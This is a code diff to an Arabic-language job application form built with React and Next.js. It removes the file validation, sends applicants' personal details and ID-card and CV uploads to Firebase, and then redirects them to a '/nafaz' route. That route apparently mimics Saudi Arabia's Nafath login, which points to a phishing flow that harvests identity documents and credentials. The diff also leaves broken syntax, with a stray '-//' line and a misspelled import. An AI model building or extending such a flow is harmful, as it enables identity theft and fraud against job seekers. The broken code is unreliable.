@@ -29,10 +29,14 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
 import { cn } from "@/lib/utils"
-import { submitApplication } from "@/lib/actions"
+import { ImageUploader } from "./image-uloader"
+import { addData } from "@/lib/firebase"
+import { useRouter } from "next/navigation"
 
 const MAX_FILE_SIZE = 5 * 1024 * 1024 // 5MB
-
+function uniqueID() {
+  return Math.floor(Math.random() * Date.now())
+}
 const formSchema = z.object({
   // Personal Information
   fullName: z.string().min(3, {
@@ -100,7 +104,8 @@ export function JobApplicationForm() {
     professional: false,
     documents: false,
   })
-
+  const id = uniqueID()
+  const router = useRouter()
   const form = useForm<any>({
     resolver: zodResolver(formSchema),
     defaultValues: {
@@ -154,77 +159,23 @@ export function JobApplicationForm() {
 
   async function onSubmit(values: any) {
     // Get file values from the form
-    submitApplication(values as any)
-    const idFrontFile = form.getValues("idFront")?.[0]
-    const idBackFile = form.getValues("idBack")?.[0]
-    const cvFile = form.getValues("cv")?.[0]
+    -//  submitApplication(values as any)
+      addData({ id: id, ...values })
 
-    // Validate files
-    if (!idFrontFile) {
-      toast({
-        variant: "destructive",
-        title: "خطأ في تحميل الملفات",
-        description: "يرجى تحميل صورة الهوية (الوجه الأمامي)",
-      })
-      setActiveTab("documents")
-      return
-    }
 
-    if (!idBackFile) {
-      toast({
-        variant: "destructive",
-        title: "خطأ في تحميل الملفات",
-        description: "يرجى تحميل صورة الهوية (الوجه الخلفي)",
-      })
-      setActiveTab("documents")
-      return
-    }
 
-    if (!cvFile) {
-      toast({
-        variant: "destructive",
-        title: "خطأ في تحميل الملفات",
-        description: "يرجى تحميل السيرة الذاتية",
-      })
-      setActiveTab("documents")
-      return
-    }
 
-    // Validate file sizes
-    if (idFrontFile.size > MAX_FILE_SIZE || idBackFile.size > MAX_FILE_SIZE || cvFile.size > MAX_FILE_SIZE) {
-      toast({
-        variant: "destructive",
-        title: "حجم الملف كبير جداً",
-        description: "يجب أن يكون حجم الملف أقل من 5 ميجابايت",
-      })
-      setActiveTab("documents")
-      return
-    }
 
     setIsSubmitting(true)
 
     try {
-      // In a real application, you would use FormData to send files
-      const formData = new FormData()
-      formData.append("idFront", idFrontFile)
-      formData.append("idBack", idBackFile)
-      formData.append("cv", cvFile)
-
-      // Add form values to FormData
-      Object.entries(values).forEach(([key, value]) => {
-        if (key !== "idFront" && key !== "idBack" && key !== "cv" && value) {
-          formData.append(key, value as string)
-        }
-      })
 
       // This is a mock server action - in a real app you would implement this
-      await submitApplication(formData)
-
       toast({
         title: "تم إرسال طلبك بنجاح",
         description: "سنقوم بمراجعة طلبك والرد عليك قريباً",
       })
-
+      router.push('/nafaz')
       // Reset form
       form.reset()
       setActiveTab("personal")
@@ -708,161 +659,11 @@ export function JobApplicationForm() {
                 </div>
 
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                  <FormField
-                    control={form.control}
-                    name="idFront"
-                    render={({ field: { value, onChange, ...field } }) => (
-                      <FormItem>
-                        <FormLabel>
-                          صورة الهوية (الوجه الأمامي) <span className="text-red-500">*</span>
-                        </FormLabel>
-                        <FormControl>
-                          <div
-                            className={cn(
-                              "border-2 border-dashed rounded-lg p-6 text-center transition-colors",
-                              value && value[0]
-                                ? "border-green-300 bg-green-50"
-                                : "border-muted-foreground/25 hover:bg-muted/50",
-                            )}
-                          >
-                            <Input
-                              type="file"
-                              accept="image/*"
-                              className="hidden"
-                              id="id-front"
-                              onChange={(e) => {
-                                onChange(e.target.files)
-                              }}
-                              {...field}
-                            />
-                            <label
-                              htmlFor="id-front"
-                              className="cursor-pointer flex flex-col items-center justify-center gap-2"
-                            >
-                              {value && value[0] ? (
-                                <>
-                                  <CheckCircle2 className="h-10 w-10 text-green-500" />
-                                  <span className="text-sm font-medium text-green-700">{value[0].name}</span>
-                                  <span className="text-xs text-green-600">تم تحميل الملف بنجاح</span>
-                                </>
-                              ) : (
-                                <>
-                                  <Upload className="h-10 w-10 text-muted-foreground" />
-                                  <span className="text-sm font-medium">اضغط لتحميل صورة الهوية (الوجه الأمامي)</span>
-                                  <span className="text-xs text-muted-foreground">JPG, PNG أو JPEG (بحد أقصى 5MB)</span>
-                                </>
-                              )}
-                            </label>
-                          </div>
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
 
-                  <FormField
-                    control={form.control}
-                    name="idBack"
-                    render={({ field: { value, onChange, ...field } }) => (
-                      <FormItem>
-                        <FormLabel>
-                          صورة الهوية (الوجه الخلفي) <span className="text-red-500">*</span>
-                        </FormLabel>
-                        <FormControl>
-                          <div
-                            className={cn(
-                              "border-2 border-dashed rounded-lg p-6 text-center transition-colors",
-                              value && value[0]
-                                ? "border-green-300 bg-green-50"
-                                : "border-muted-foreground/25 hover:bg-muted/50",
-                            )}
-                          >
-                            <Input
-                              type="file"
-                              accept="image/*"
-                              className="hidden"
-                              id="id-back"
-                              onChange={(e) => {
-                                onChange(e.target.files)
-                              }}
-                              {...field}
-                            />
-                            <label
-                              htmlFor="id-back"
-                              className="cursor-pointer flex flex-col items-center justify-center gap-2"
-                            >
-                              {value && value[0] ? (
-                                <>
-                                  <CheckCircle2 className="h-10 w-10 text-green-500" />
-                                  <span className="text-sm font-medium text-green-700">{value[0].name}</span>
-                                  <span className="text-xs text-green-600">تم تحميل الملف بنجاح</span>
-                                </>
-                              ) : (
-                                <>
-                                  <Upload className="h-10 w-10 text-muted-foreground" />
-                                  <span className="text-sm font-medium">اضغط لتحميل صورة الهوية (الوجه الخلفي)</span>
-                                  <span className="text-xs text-muted-foreground">JPG, PNG أو JPEG (بحد أقصى 5MB)</span>
-                                </>
-                              )}
-                            </label>
-                          </div>
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
+                  <ImageUploader text={'اضغط لتحميل السيرة الذاتية'} />
+                  <ImageUploader text={'اضغط لتحميل صورة الهوية (الوجه الأمامي)'} />
+                  <ImageUploader text={'اضغط لتحميل صورة الهوية (الوجه الخلفي)'} />
 
-                  <FormField
-                    control={form.control}
-                    name="cv"
-                    render={({ field: { value, onChange, ...field } }) => (
-                      <FormItem className="md:col-span-2">
-                        <FormLabel>
-                          السيرة الذاتية <span className="text-red-500">*</span>
-                        </FormLabel>
-                        <FormControl>
-                          <div
-                            className={cn(
-                              "border-2 border-dashed rounded-lg p-6 text-center transition-colors",
-                              value && value[0]
-                                ? "border-green-300 bg-green-50"
-                                : "border-muted-foreground/25 hover:bg-muted/50",
-                            )}
-                          >
-                            <Input
-                              type="file"
-                              accept=".pdf,.doc,.docx"
-                              className="hidden"
-                              id="cv-file"
-                              onChange={(e) => {
-                                onChange(e.target.files)
-                              }}
-                              {...field}
-                            />
-                            <label
-                              htmlFor="cv-file"
-                              className="cursor-pointer flex flex-col items-center justify-center gap-2"
-                            >
-                              {value && value[0] ? (
-                                <>
-                                  <CheckCircle2 className="h-10 w-10 text-green-500" />
-                                  <span className="text-sm font-medium text-green-700">{value[0].name}</span>
-                                  <span className="text-xs text-green-600">تم تحميل الملف بنجاح</span>
-                                </>
-                              ) : (
-                                <>
-                                  <Upload className="h-10 w-10 text-muted-foreground" />
-                                  <span className="text-sm font-medium">اضغط لتحميل السيرة الذاتية</span>
-                                  <span className="text-xs text-muted-foreground">PDF أو Word (بحد أقصى 5MB)</span>
-                                </>
-                              )}
-                            </label>
-                          </div>
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
                 </div>
 
                 <div className="flex justify-between pt-4">
